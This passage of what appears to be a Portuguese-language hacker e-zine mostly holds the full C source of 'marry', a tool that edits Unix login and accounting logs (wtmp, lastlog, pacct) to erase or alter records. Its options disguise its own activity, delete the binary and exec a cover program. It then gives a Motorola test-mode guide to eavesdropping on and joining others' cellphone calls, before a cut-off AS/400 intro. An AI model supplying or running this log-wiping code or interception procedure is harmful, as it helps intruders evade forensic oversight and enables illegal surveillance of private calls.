+#if !defined(gcc)
+#  define NO_VOID /* non gcc, early compiliers */
+#endif
+
+#ifndef __SVR3
+extern char *optarg;
+#endif
+
+#ifdef NO_VOID
+#  define VOID int
+#  define FVOID
+#else
+#  define VOID void
+#  define FVOID void
+#endif
+
+#ifndef bool
+#  define bool char
+#endif
+
+#define match(a,b) (match_s((a), (b), sizeof(a)))
+
+#ifdef UTMP
+#ifdef UTMPX
+#  include <utmpx.h>
+#  define S_UTMP utmpx
+#  define UT_HOST ut_host
+#  define UT_ID ut_id
+#  define UT_TYPE ut_type
+#  define UT_PID ut_pid
+#  define UT_TV ut_tv
+#  ifdef _PATH_WTMPX
+#    define WTMP_FILE _PATH_WTMPX
+#  else
+#    ifdef WTMPX_FILE
+#      define WTMP_FILE WTMPX_FILE
+#    else
+#      define WTMP_FILE "/usr/adm/wtmpx"
+#    endif
+#  endif
+#else
+#  include <utmp.h>
+#  define S_UTMP utmp
+#  ifndef WTMP_FILE
+#    ifdef _PATH_WTMP
+#      define WTMP_FILE _PATH_WTMP
+#    else
+#      define WTMP_FILE "/usr/adm/wtmp"
+#    endif
+#  endif
+#  if !defined(ut_name) && !defined(ut_user)
+#    define ut_user ut_name
+#  endif
+#  if defined(linux) || defined(bsd) || defined(sun)
+#    define UT_HOST ut_host
+#  endif
+#  ifdef linux
+#    define UT_ADDR ut_addr
+#  endif
+#  define UT_TIME ut_time
+#  if defined(linux) || defined(solaris)
+#    define UT_PID  ut_pid
+#    define UT_ID   ut_id
+#  endif
+#  if defined(linux) || defined(solaris) || defined(sysv) || defined(SYSV) || defined(SVR4)
+#    define UT_TYPE ut_type
+#  endif
+#endif
+#endif
+
+#ifdef LASTLOG
+#  ifdef bsd
+#    ifndef UTMP
+#      include <utmp.h>
+#    endif
+#  else
+#    include <lastlog.h>
+#  endif
+#  ifndef LASTLOG_FILE
+#    ifdef _PATH_LASTLOG
+#      define LASTLOG_FILE _PATH_LASTLOG
+#    else
+#      define LASTLOG_FILE "/usr/adm/lastlog"
+#    endif
+#  endif
+#  define LL_HOST ll_host
+#endif
+
+#ifdef PACCT
+#  include <sys/acct.h>
+#  ifdef bsd
+#    define PACCT_FILE "/var/account/acct"
+#  else
+#    define PACCT_FILE "/usr/adm/pacct"
+#  endif
+#endif
+
+#ifdef UT_ADDR
+#  include <arpa/inet.h>
+#endif
+
+FILE *ofh, *ifh, *afh;
+
+#ifdef UTMP
+struct S_UTMP s_utmp;
+#endif
+#ifdef LASTLOG
+struct lastlog s_lastlog;
+#endif
+#ifdef PACCT
+struct acct s_acct;
+struct acct ac_saved;
+int acct_step;
+#endif
+char ac_comm_hide[32];
+
+struct passwd *uid;
+struct passwd uid_s;
+char **uida=NULL;
+char **gida=NULL;
+
+#define MAX_UID 65537
+
+char *quotes="\"\"";
+
+int globline=0;
+
+char *a_Input=NULL;
+char *a_Output=NULL;
+char *a_Pattern=NULL;
+char *a_Hide=NULL;
+#ifdef sun
+char *a_Editor="/usr/ucb/vi";
+#else
+char *a_Editor="/usr/bin/vi";
+#endif
+char *a_Dump="marry.dmp";
+char *a_Backup="marry.bak";
+bool f_Auto=0;
+bool f_Squeeze=0;
+bool f_EditSrc=0;
+bool f_Truncate=0;
+bool f_Exclude=0;
+bool f_Uid=0;
+bool f_Security=0;
+bool f_Clean=0;
+bool f_DeleteSelf=0;
+bool f_NoBackups=0;
+bool f_backedup;
+char mode;
+
+int mode_size=0;
+void *mode_data;
+
+int globline;
+char *mes;
+time_t otime=0;
+FVOID display()
+{
+static int n;
+time_t t;
+	globline++;
+	if (n++<30) return; /* don't want too many context switches */
+	n=0;
+	time(&t);
+	if (t<(otime+1)) return;
+	otime=t;
+	printf("%s%d\r", mes, globline);
+	fflush(stdout);
+}
+FVOID display_end()
+{
+	printf("%s%d\n", mes, globline);
+	fflush(stdout);
+}
+
+#ifdef NO_VOID
+char
+#else
+void
+#endif
+*
+Smalloc(n)
+int n;
+{
+#ifdef NO_VOID
+char
+#else
+void
+#endif
+* p;
+	while (!(p=malloc(n))) sleep(1);
+	return p;
+}
+
+bool copyf(src, dst)
+char *src;
+char *dst;
+{
+#define CBUFLEN 128*1024
+int fi, fo;
+char *buf;
+int cc;
+	if ((fi=open(src, O_RDONLY, 0))<0)
+	{
+		perror(src);
+		exit(1);
+	}
+	if ((fo=open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0666))<0)
+	{
+		perror(dst);
+		exit(1);
+	}
+	buf=Smalloc(CBUFLEN);
+	while ((cc=read(fi, buf, CBUFLEN))>0)
+		if (write(fo, buf, cc)!=cc)
+		{
+			perror(dst);
+			exit(1);
+		}
+	close(fo);
+	close(fi);
+	free(buf);
+	return 1;
+}
+
+bool backup(src)
+char *src;
+{
+	printf("backup = %s\n", a_Backup);
+	fflush(stdout);
+	return copyf(src, a_Backup);
+}
+
+char *match_s(haystack, needle, n)
+char *haystack;
+char *needle;
+int n;
+{
+static char tmp[256];
+	strncpy(tmp, haystack, n>sizeof(tmp)? sizeof(tmp): n);
+	return strstr(tmp, needle);
+}
+
+unsigned short atoi2(s)
+char *s;
+{
+	return (s[0]-'0')*10+(s[1]-'0');
+}
+
+char *p_string(s, size)
+char *s;
+int size;
+{
+static char sss[1024];
+register int n;
+char *ss=sss;
+	if (!*s) return quotes;
+
+	for (n=0; n<size; n++)
+	{
+		char c=s[n];
+		switch (c)
+		{
+		case '\\':
+			*(ss++)=c;
+			break;
+		case ' ':
+			*(ss++)='\\';
+			break;
+		case '\t':
+			*(ss++)='\\';
+			c='t';
+			break;
+		case '\n':
+			*(ss++)='\\';
+			c='n';
+			break;
+		case '\r':
+			*(ss++)='\\';
+			c='r';
+			break;
+		case 0:
+			goto end;
+		}
+		*(ss++)=c;
+	}
+end:
+	*ss=0;
+	return sss;
+}
+
+char *skip_white(s)
+char *s;
+{	for (; *s && (*s=='\t' || *s==' '); s++);
+	if (!*s || (*s=='\n')) return NULL;
+	return s;
+}
+
+char *g_string(d, s, size)
+char *d;
+char *s;
+int size;
+{
+int y;
+char c;
+char f_esc=0;
+	for (y=0; y<size; y++) d[y]=0;
+	if (!(s=skip_white(s))) return NULL;
+	if (*s=='"' && *(s+1)=='"') return s+2;
+	for (y=0; y<size; s++)
+	{
+		c=*s;
+		if (f_esc)
+		{
+			switch(c)
+			{
+			case 'r':
+				c='\r';
+				break;
+			case 'n':
+				c='\n';
+				break;
+			case 't':
+				c='\t';
+				break;
+			}
+			f_esc=0;
+		} else {
+			switch(c)
+			{
+			case '\\':
+				f_esc=1;
+				continue;
+			case ' ':
+			case '\t':
+			case '\n':
+			case '\0':
+				goto end;
+			}
+		}
+		d[y++]=c;
+	}
+end:
+	return s+1;
+}
+
+char *time_s(tt)
+time_t tt;
+{
+static char s[13];
+	time_t t=tt; /* some compilers won't take a parameter address */
+	struct tm *tp;
+	tp=localtime(&t);
+	sprintf(s, "%02d%02d%02d%02d%02d%02d",
+		tp->tm_year, tp->tm_mon+1, tp->tm_mday,
+		tp->tm_hour, tp->tm_min, tp->tm_sec);
+	return s;
+}
+
+time_t time_i(s)
+char *s;
+{
+	struct tm lt;
+	time_t t;
+	if (strlen(s)!=12) return (time_t)-1;
+	time(&t);
+	lt=*localtime(&t);
+	lt.tm_year=atoi2(s);
+	lt.tm_mon=atoi2(s+2)-1;
+	lt.tm_mday=atoi2(s+4);
+	lt.tm_hour=atoi2(s+6);
+	lt.tm_min=atoi2(s+8);
+	lt.tm_sec=atoi2(s+10);
+	lt.tm_isdst=-1;
+	return mktime(&lt);
+}
+
+char *
+bgetgrgid(u)
+gid_t u;
+{
+struct group *gr;
+	if (!gida)
+	{
+		int n;
+		gida=(char **)Smalloc(sizeof(char *)*MAX_UID);
+		for (n=0; n<MAX_UID; n++) gida[n]=NULL;
+	}
+	if (gida[u]==(char *)-1) return NULL;
+	if (gida[u]) return gida[u];
+	if (!(gr=getgrgid(u)))
+	{
+		gida[u]=(char *)-1;
+		return NULL;
+	}
+	gida[u]=Smalloc(strlen(gr->gr_name)+1);
+	strcpy(gida[u], gr->gr_name);
+	return gida[u];
+}
+
+char *
+bgetpwuid(u)
+uid_t u;
+{
+struct passwd *pw;
+	if (!uida)
+	{
+		int n;
+		uida=(char **)Smalloc(sizeof(struct passwd *)*MAX_UID);
+		for (n=0; n<MAX_UID; n++) uida[n]=NULL;
+	}
+	if (uida[u]==(char *)-1) return NULL;
+	if (uida[u]) return uida[u];
+	if (!(pw=getpwuid(u)))
+	{
+		uida[u]=(char *)-1;
+		return NULL;
+	}
+	uida[u]=Smalloc(strlen(pw->pw_name)+1);
+	strcpy(uida[u], pw->pw_name);
+	return uida[u];
+}
+
+#ifdef UTMP
+bool dump_utmp(uline, ut)
+int uline;
+struct S_UTMP *ut;
+{
+	time_t tim;
+	if (a_Pattern)
+	{
+		if (!match(ut->ut_user, a_Pattern) &&
+		    !match(ut->ut_line, a_Pattern)
+#ifdef UT_HOST
+		    && !match(ut->UT_HOST, a_Pattern)
+#endif
+			) {if (!f_Exclude) return 1;}
+		else if (f_Exclude) return 1;
+	 }
+	fprintf(afh, "%05x", uline-1);
+	fprintf(afh, " %-8s", p_string(ut->ut_user, sizeof(ut->ut_user)));
+	fprintf(afh, " %-11s", p_string(ut->ut_line, sizeof(ut->ut_line)));
+#ifdef UT_ID
+	fprintf(afh, " %-4s", p_string(ut->UT_ID, sizeof(ut->UT_ID)));
+#endif
+#ifdef UT_TYPE
+	fprintf(afh, " %-2x", ut->UT_TYPE);
+#endif
+#ifdef UT_PID
+	fprintf(afh, " %-5d", (int)ut->UT_PID);
+#endif
+#if defined(UT_TIME) || defined (UT_TV)
+#  ifdef UT_TIME
+	tim=ut->UT_TIME;
+#  else
+	tim=ut->UT_TV.tv_sec;
+#  endif
+	fprintf(afh, " %s", time_s(tim));
+#endif
+#ifdef UT_ADDR
+	fprintf(afh, " %-15s", inet_ntoa(*((struct in_addr *)&ut->UT_ADDR)));
+#endif
+#ifdef UT_HOST
+	fprintf(afh, " %s", p_string(ut->UT_HOST, sizeof(ut->UT_HOST)));
+#endif
+	fputc('\n', afh);
+	return 1;
+}
+#endif
+
+#ifdef LASTLOG
+bool dump_lastlog(uline, ll)
+int uline;
+struct lastlog *ll;
+{
+	char *name;
+	struct passwd *pw;
+	if (f_Uid)
+	{
+		pw=getpwuid(uline-1);
+		name=pw? pw->pw_name: quotes;
+	} else
+	{
+	  static char s[6];
+	  	sprintf(s, "%05d", uline-1);
+		name=s;
+	}
+	if (a_Pattern)
+	{
+		if (
+		    (!uid || (uid->pw_uid!=(uline-1))) &&
+		    (!f_Uid || strstr(name, a_Pattern)) &&
+#ifdef LL_HOST
+		    !match(ll->ll_host, a_Pattern) &&
+#endif
+		    !match(ll->ll_line, a_Pattern)
+			) {if (!f_Exclude) return 1;}
+		else if (f_Exclude) return 1;
+	 }
+	fprintf(afh, "%05x", uline-1);
+	fprintf(afh, " %-8s", name);
+	fprintf(afh, " %-11s", p_string(ll->ll_line, sizeof(ll->ll_line)));
+	fprintf(afh, " %s", time_s(ll->ll_time));
+#ifdef LL_HOST
+	fprintf(afh, " %s", p_string(ll->LL_HOST, sizeof(ll->LL_HOST)));
+#endif
+	fputc('\n', afh);
+	return 1;
+}
+#endif
+
+#ifdef PACCT
+bool dump_pacct(uline, ac)
+int uline;
+struct acct *ac;
+{
+	char *name;
+	char *gr_name;
+	if (!(name=bgetpwuid(ac->ac_uid)))
+	{
+	  static char s[6];
+	  	sprintf(s, "%05d", ac->ac_uid);
+		name=s;
+	}
+	if (!(gr_name=bgetgrgid(ac->ac_gid)))
+	{
+	  static char s[6];
+	  	sprintf(s, "%05d", ac->ac_gid);
+		gr_name=s;
+	}
+	if (a_Pattern)
+	{
+		if (
+		    (!uid || (uid->pw_uid!=ac->ac_uid)) &&
+		    (strstr(name, a_Pattern)) &&
+		    (strstr(gr_name, a_Pattern))
+			) {if (!f_Exclude) return 1;}
+		else if (f_Exclude) return 1;
+	}
+	fprintf(afh, "%05x", uline-1);
+	fprintf(afh, " %-8s", name);
+	fprintf(afh, " %-8s", gr_name);
+	fprintf(afh, " %-10s", p_string(ac->ac_comm, sizeof(ac->ac_comm)));
+	if (ac->ac_tty==(dev_t)-1)
+		fputs(" ----", afh);
+	else
+		fprintf(afh, " %04x", ac->ac_tty);
+	fprintf(afh, " %2x", ac->ac_flag);
+	fprintf(afh, " %s", time_s(ac->ac_btime));
+	fputc('\n', afh);
+	return 1;
+}
+#endif
+
+FVOID makedump()
+{
+int uline;
+	if ((ifh=fopen(a_Input, "r"))==NULL)
+	{
+		perror(a_Input);
+		exit(1);
+	}
+	if ((afh=fopen(a_Dump, "w"))==NULL)
+	{
+		perror(a_Dump);
+		exit(1);
+	}
+	fputc('\n', stdout);
+	globline=0;
+	mes="entries disassembled: ";
+	for (uline=1; fread(mode_data, mode_size, 1, ifh)>0; uline++)
+	{
+		display();
+		switch(mode)
+		{
+#ifdef UTMP
+		case 'W':
+			dump_utmp(uline, mode_data);
+			break;
+#endif
+#ifdef LASTLOG
+		case 'L':
+			dump_lastlog(uline, mode_data);
+			break;
+#endif
+#ifdef PACCT
+		case 'A':
+			dump_pacct(uline, mode_data);
+			break;
+#endif
+		}
+	}
+	display_end();
+	fclose(afh);
+	fclose(ifh);
+}
+
+int seek_ifh(uline)
+int uline;
+{
+	if (ftell(ifh)!=mode_size*(uline-1))
+		if (fseek(ifh, mode_size*(uline-1), SEEK_SET)==-1)
+			return 0;
+	return 1;
+}
+
+#ifdef UTMP
+int mod_utmp(ut, p)
+struct S_UTMP *ut;
+char *p;
+{
+	char *op;
+static char tmp[255];
+#if defined(UT_TIME) || defined(UT_TV)
+#endif
+	op=p;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if (!(p=g_string(ut->ut_user, p, sizeof(ut->ut_user)))) return 0;
+	if (!(p=g_string(ut->ut_line, p, sizeof(ut->ut_line)))) return 0;
+#ifdef UT_ID
+	if (!(p=g_string(ut->UT_ID, p, sizeof(ut->UT_ID)))) return 0;
+#endif
+#ifdef UT_TYPE
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	sscanf(tmp, "%x", (unsigned int *)&(ut->UT_TYPE));
+#endif
+#ifdef UT_PID
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	ut->UT_PID=atoi(tmp);
+#endif
+#if defined(UT_TIME) || defined(UT_TV)
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+#  ifdef UT_TIME
+	if ((ut->UT_TIME=time_i(tmp))==(time_t)-1)
+#  else /* UT_TV */
+	if ((ut->UT_TV.tv_sec=time_i(tmp))==(time_t)-1)
+#  endif
+		fprintf(stderr, "warning: invalid time spec %s", op);
+#endif
+#ifdef UT_ADDR
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	ut->UT_ADDR=inet_addr(tmp);
+#endif
+#ifdef UT_HOST
+	if (!(p=g_string(ut->UT_HOST, p, sizeof(ut->UT_HOST)))) return 0;
+#endif
+	return 1;
+}
+#endif
+
+#ifdef LASTLOG
+int mod_lastlog(ll, p)
+struct lastlog *ll;
+char *p;
+{
+	char *op;
+static char tmp[255];
+	op=p;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0; /*skip name*/
+	if (!(p=g_string(ll->ll_line, p, sizeof(ll->ll_line)))) return 0;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if ((ll->ll_time=time_i(tmp))==(time_t)-1)
+		fprintf(stderr, "warning illegal time: %s\n", op);
+#ifdef LL_HOST
+	if (!(p=g_string(ll->ll_host, p, sizeof(ll->ll_host)))) return 0;
+#endif
+	return 1;
+}
+#endif
+
+#ifdef PACCT
+int mod_pacct(ac, p)
+struct acct *ac;
+char *p;
+{
+static char tmp[255];
+struct passwd *pw;
+struct group *gr;
+char *op;
+long int t;
+unsigned int tu;
+	op=p;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if (sscanf(tmp, "%ld", &t)!=1)
+	{
+		if (!(pw=getpwnam(tmp)))
+			fprintf(stderr, "warning: unknown username %s\n", op);
+		else
+			ac->ac_uid=pw->pw_uid;
+	} else ac->ac_uid=t;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if (sscanf(tmp, "%ld", &t)!=1)
+	{
+		if (!(gr=getgrnam(tmp)))
+			fprintf(stderr, "warning: unknown group %s\n", op);
+		else
+			ac->ac_gid=pw->pw_gid;
+	} else ac->ac_gid=t;
+	if (!(p=g_string(ac->ac_comm, p, sizeof(ac->ac_comm)))) return 0;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if (sscanf(tmp, "%x", &tu)!=1) ac->ac_tty=(dev_t)-1;
+	else ac->ac_tty=tu;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if (sscanf(tmp, "%x", &tu)!=1)
+		fprintf(stderr, "warning: invalid flags %s\n", op);
+	else ac->ac_flag=tu;
+	if (!(p=g_string(tmp, p, sizeof(tmp)))) return 0;
+	if ((ac->ac_btime=time_i(tmp))==(time_t)-1)
+		fprintf(stderr, "warning: illegal time: %s\n", op);
+	return 1;
+}
+#endif
+
+bool wcopy(uline)
+int uline;
+{
+	if (!seek_ifh(uline)) return 0;
+	while (fread(mode_data, mode_size, 1, ifh)>0)
+	{
+		display();
+#ifdef PACCT
+		if (f_Security && f_Auto && mode=='A')
+		{
+			struct acct *p;
+			p=(struct acct *)mode_data;
+			if (!strncmp(p->ac_comm, ac_comm_hide, sizeof(ac_comm_hide)))
+			{
+				ac_saved.ac_btime=p->ac_btime;
+				*p=ac_saved;
+			}
+		}
+#endif
+		if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
+	}
+#ifndef NO_FTRUNCATE
+	if (f_Squeeze && f_EditSrc) ftruncate(fileno(ofh), ftell(ofh));
+#endif
+	return 1;
+}
+
+bool domod(p)
+char *p;
+{
+bool ret=0;
+	if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
+	switch(mode)
+	{
+#ifdef UTMP
+	case 'W':
+		ret=mod_utmp(mode_data, p);
+		break;
+#endif
+#ifdef LASTLOG
+	case 'L':
+		ret=mod_lastlog(mode_data, p);
+		break;
+#endif
+#ifdef PACCT
+	case 'A':
+		ret=mod_pacct(mode_data, p);
+		break;
+#endif
+	}
+	if (!ret)
+		fprintf(stderr, "warning: invalid dump input `%s'\n", p);
+	return 1;
+}
+
+static wu_line=0;
+
+int obj_update(uline, p, f_mod)
+int uline;
+char *p;
+char f_mod;
+{
+	if (f_Squeeze)
+	{
+		display();
+		seek_ifh(uline);
+		if (f_mod) {if (!domod(p)) return 0;}
+		else if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
+		if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
+	} else {
+		if (f_EditSrc)
+		{
+			if (f_mod)
+				fseek(ofh, mode_size*(uline-1), SEEK_SET);
+		} else {
+			while(++wu_line<uline)
+			{
+				display();
+				if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
+				if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
+			}
+		}
+		if (f_mod)
+		{
+			seek_ifh(uline);
+			if (!domod(p)) return 0;
+			if (f_mod==2) wu_line--;
+		} else if (fread(mode_data, mode_size, 1, ifh)<1) return 0;
+		if (fwrite(mode_data, mode_size, 1, ofh)<1) return 0;
+		display();
+	}
+#ifdef PACCT
+	if (f_Security && f_Auto && !f_mod && mode=='A')
+		if (!uline%acct_step) ac_saved=*(struct acct *)mode_data;
+#endif
+	return 1;
+}
+
+FVOID makeobject()
+{
+int uline=1;
+char line[1024];
+char *p;
+char f_mod;
+	if ((ifh=fopen(a_Input, "r"))==NULL)
+	{
+		perror(a_Input);
+		exit(1);
+	}
+	if ((afh=fopen(a_Dump, "r"))==NULL)
+	{
+		perror(a_Dump);
+		exit(1);
+	}
+	if ((ofh=fopen(a_Output, f_EditSrc? "r+": "w"))==NULL)
+	{
+		perror(a_Output);
+		exit(1);
+	}
+#ifdef PACCT
+	if (f_Security && f_Auto && mode=='A')
+		acct_step=(getpid()+8)%60;
+#endif
+	fputc('\n', stdout);
+	globline=0;
+	mes="entries assembled: ";
+	while (1)
+	{
+		if (!fgets((p=line), sizeof(line), afh))
+		{
+			if (f_EditSrc)
+			{
+#ifndef NO_FTRUNCATE
+				if (f_Truncate)
+				{
+					fflush(ofh);
+					ftruncate(fileno(ofh), uline*mode_size);
+				}
+#endif
+				goto closeup;
+			}
+			if (!f_Truncate) wcopy(uline+1);
+			goto closeup;
+		}
+		switch (*p)
+		{
+		case 0:
+		case '#':
+		case '\n':
+			continue;
+		case '=':
+			f_mod=1;
+			p++;
+			break;
+		case '+':
+			if (f_EditSrc)
+			{
+				if (f_Squeeze)
+					fprintf(stderr, "warning: the + operator can have \
+unpredictable effects when used in conbination with -e and -s\n");
+				else
+				{
+					fprintf(stderr, "error: + operator used with -e\n");
+					exit(1);
+				}
+			}
+			f_mod=2;
+			p++;
+			break;
+		default: {f_mod=0; break;}
+		}
+		if (sscanf(p, "%x", &uline)!=1)
+		{
+			perror("invalid line number in ascii input");
+			exit(1);
+		}
+		uline++;
+		if (!obj_update(uline, p, f_mod))
+ 		{
+			perror("read/write failed");
+			exit(1);
+		}
+	}
+closeup:
+	display_end();
+	fclose(ofh);
+	fclose(ifh);
+	fclose(afh);
+}
+
+FVOID usage(s)
+char *s;
+{
+	fprintf(stderr, "usage: %s\t[-aetsuScDn] [-i src] [-o obj] [-d dump] [-p pat] [-v pat] [-m [WLA]]\n\
+\t\t[-E editor] [-h program]\n", s);
+	exit(1);
+}
+
+int main(argc, argv)
+int argc;
+char **argv;
+{
+	char *ed;
+	char c;
+#ifdef PACCT
+	mode='A';
+#endif
+#ifdef LASTLOG
+	mode='L';
+#endif
+#ifdef UTMP
+	mode='W';
+#endif
+
+	puts("marry v1.0 (c) 1991 -- Proff -- All rights reserved.");
+	umask(022);
+	while ((c=getopt(argc, argv, "i:o:d:aetsp:v:m:uScDnE:h:b:"))!=-1)
+	switch(c)
+	{
+		case 'i':
+			a_Input=optarg;
+			break;
+		case 'o':
+			a_Output=optarg;
+			break;
+		case 'd':
+			a_Dump=optarg;
+			break;
+		case 'a':
+			f_Auto=1;
+			break;
+		case 'e':
+			f_EditSrc=1;
+			break;
+		case 't':
+			f_Truncate=1;
+			break;
+		case 's':
+			f_Squeeze=1;
+			break;
+		case 'p':
+			a_Pattern=optarg;
+			break;
+		case 'v':
+			f_Exclude=1;
+			a_Pattern=optarg;
+			break;
+		case 'm':
+			mode=*optarg;
+			break;
+		case 'u':
+			f_Uid=1;
+			break;
+		case 'S':
+			f_Security=1;
+			break;
+		case 'c':
+			f_Clean=1;
+			break;
+		case 'D':
+			f_DeleteSelf=1;
+			break;
+		case 'n':
+			f_NoBackups=1;
+			break;
+		case 'E':
+			a_Editor=optarg;
+			break;
+		case 'h':
+			a_Hide=optarg;
+			break;
+		case 'b':
+			a_Backup=optarg;
+			break;
+		case '?':
+		default:
+			fprintf(stderr, "%s: unknown option `%c'\n", argv[0], c);
+			usage(argv[0]);
+			/* NOT_REACHED */
+	}
+	if (a_Output && f_EditSrc)
+	{
+		perror("can't have -o and -e together");
+		exit(1);
+	}
+	switch(mode)
+	{
+#ifdef UTMP
+	case 'W':
+		mode_size=sizeof(struct S_UTMP);
+		mode_data=&s_utmp;
+		if (!a_Input) a_Input=WTMP_FILE;
+		break;
+#endif
+#ifdef LASTLOG
+	case 'L':
+		mode_size=sizeof(struct lastlog);
+		mode_data=&s_lastlog;
+		if (!a_Input) a_Input=LASTLOG_FILE;
+		break;
+#endif
+#ifdef PACCT
+	case 'A':
+		mode_size=sizeof(struct acct);
+		mode_data=&s_acct;
+		if (!a_Input) a_Input=PACCT_FILE;
+		break;
+#endif
+        default:
+		fprintf(stderr, "unknown mode `%c'\n", mode);
+		usage();
+		/*NOT_REACHED*/
+	}
+	if (a_Pattern) uid=getpwnam(a_Pattern);
+	if (uid) {uid_s=*uid; uid=&uid_s;}
+	if (f_Auto)
+	{
+	struct stat st1, st2;
+	int pid;
+	int ws;
+		if (stat(a_Editor, &st1))
+		{
+			fprintf(stderr, "error: editor `%s' must exist with -a (check -E value)\n", a_Editor);
+			exit(1);
+		}
+		makedump();
+		if (f_Security)
+		{
+			sprintf(ac_comm_hide, "m%d", getpid());
+			symlink(a_Editor, ac_comm_hide);
+			ed=ac_comm_hide;
+		} else  ed=a_Editor;
+
+		stat(a_Dump, &st1);
+		if (!(pid=fork()))
+		{
+			printf("%s %s\n", ed, a_Dump);
+			fflush(stdout);
+			execlp(ed, ed, a_Dump, 0);
+			perror(ed);
+			_exit(1);
+		}
+		if (pid<0)
+		{
+			perror("fork");
+			exit(1);
+		}
+		while (wait(&ws)!=pid);
+		if (f_Security)
+			unlink(ac_comm_hide);
+		stat(a_Dump, &st2);
+		if (st1.st_mtime==st2.st_mtime)
+		{
+			fprintf(stderr, "`%s' not modified -- aborted\n", a_Dump);
+			exit(1);
+		}
+		if (!a_Output || !strcmp(a_Input, a_Output))
+		{
+			backup(a_Input);
+			f_backedup=1;
+			if (!a_Output) a_Output=a_Input;
+			if (!f_EditSrc)
+				a_Input=a_Backup;
+		}
+		makeobject();
+		if (f_Clean)
+			unlink(a_Dump);
+		if ((f_Clean || f_NoBackups) && f_backedup) unlink(a_Backup);
+	}
+	else if (a_Output)
+		{
+			if (!strcmp(a_Input, a_Output))
+			{
+				backup(a_Input);
+				f_backedup=1;
+				if (!f_EditSrc)
+					a_Input=a_Backup;
+			}
+			makeobject();
+			if (f_Clean)
+				unlink(a_Dump);
+			if ((f_Clean || f_NoBackups) && f_backedup) unlink(a_Backup);
+		} else
+			makedump();
+	if (f_DeleteSelf) unlink(argv[0]);
+	puts("Done.");
+	if (f_Security)
+	{
+		close(0);
+		close(1);
+		close(2);
+		setsid();
+		if (a_Hide)
+		{
+			execlp(a_Hide, a_Hide, 0);
+			perror(a_Hide);
+		}
+		if (f_Security)
+			kill(getpid(), SIGKILL);
+	}
+	exit(0);
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+E eu tambem ia dizer que nunca e' bom ter apenas 1 log, pois nao da pra
+garantir nada. Por isto, existem programas como:
+
+SWATCH       - ftp://coast.cs.purdue.edu/pub/tools/unix/swatch/
+Watcher      - http://www.i-pi.com
+lsof         - ftp://coast.cs.purdue.edu/pub/tools/unix/swatch
+Ping Logger  - http://ryanspc.com/tools/pinglogger.tar.gz
+
+e que e' aconselhavel comparar os logs, e sempre ter um ou mais programas
+de logs no sistema. Mas como eu to com preguica de reelaborar a materia que
+eu perdi (leia os esclarecimentos la em cima), eu nao vou escrever.
+
+        Cacaio
+        `'`'`'
+
+-=[  11  ]=-
+.------------------------------.
+| Phreaking Celulares Motorola  \____________________________________________
+`----------------------------------------------------------------------------'
+                              by Cheat Struck
+
+	Nesta materia eu vou falar da conhecida escuta em celulares motorola
+que jah se espalharam absurdamente pela inet com varios problemas dos quais
+eu pretendo corrigir aqui.
+	Voce jah deve saber como entrar no testmode do motorola nao??? Aqui
+jah se encontra um erro nas explicacoes encontradas em tudo quanto e' page
+hacker. Na maioria das pages dizem que basta colocar um papel laminado no
+conector neutro ( o do meio ) da bateria. Porem nas versoes NEWER e 95XX do
+software, basta digitar a seguinte sequencia:
+
+[FCN]  [0]  [0]  [*]  [*]  [8]  [3]  [7]  [8]  [6]  [6]  [3]  [3]  [STO]
+
+	Dentro do testmode, a primeira coisa que tem que se fazer e' achar um
+canal que esteja sendo usado. Em telefones TDMAs existe um escaneador de
+canais ( Esteja conciente de que telefones TDMAs sao usados em redes telefo-
+nicas TDMAs).
+	Para ativar o escaneador, basta entrar com o comando..
+
+36nnn#
+
+        Sendo que nnn e' o tempo em milisegundos que os canais serao mostrados.
+        Os canais variam de 1 para 666 e a tecla para cancelar e' [*].
+	Apos conseguido um canal, voce tera' que acertar o Receptor de Audio e
+ o Transmissor. Use os devidos comandos:
+
+07#		Desliga o Receptor de Audio
+08#		Liga o Receptor de Audio
+
+09#		Desliga o Transmissor de Audio
+10#		Liga o Transmissor de Audio
+
+	Com isso nao e' apenas possivel ouvir o que os outros estam falando
+como tambem entrar na conversa como se fosse uma linha cruzada.
+	A ultima coisa a se fazer e' acertar o canal. Para isso use:
+
+11xxxx#
+
+	Sendo que o xxxx e' o numero do canal.
+	Pronto. Voce esta' fazendo a famosa escuta celular. Mas nao acaba por
+isso so'. Em alguns casos acontece do canal sendo usado e' redirecionado a
+outro por motivos diversos.
+	Para resolver o problema deve se fazer a famosa hackeada no FOVC.
+	Como??? Entre com o seguinte comando:
+
+40#
+
+	Com isso voce recebera uma serie de 10 numeros hexadecimais.
+	Separemos esses numeros no que realmente importa...
+	Ex:
+
+	023a56d70e
+
+	XXXX56dXXX
+	    |
+	    +---> Este e' o Voice Channel Word.
+
+	Pegamos entao essas 3 variaveis e transformamo-as em binario...
+
+	5	-	0101
+	6	-	0110
+	d	-	1101
+
+	Juntamos tudo..                          010101101101
+	Retiramos os 2 primeiros numeros..         0101101101
+	E transformamos em decimal..                      365
+
+	Prontu!! 365 e' o canal para onde foi redirecionada a conversa.
+
+        Cheat Struck
+        `'`'`'`'`'`'
+
+-=[  12  ]=-
+.------------------------------------------.
+| Introducao ao AS/400 | Conceitos Basicos  \________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+I. Principais aspectos
+
+O AS/400 e' uma computador feito pela IBM que roda o sistema operacional
+OS/400. Aqui estao os tres principais aspectos dele:
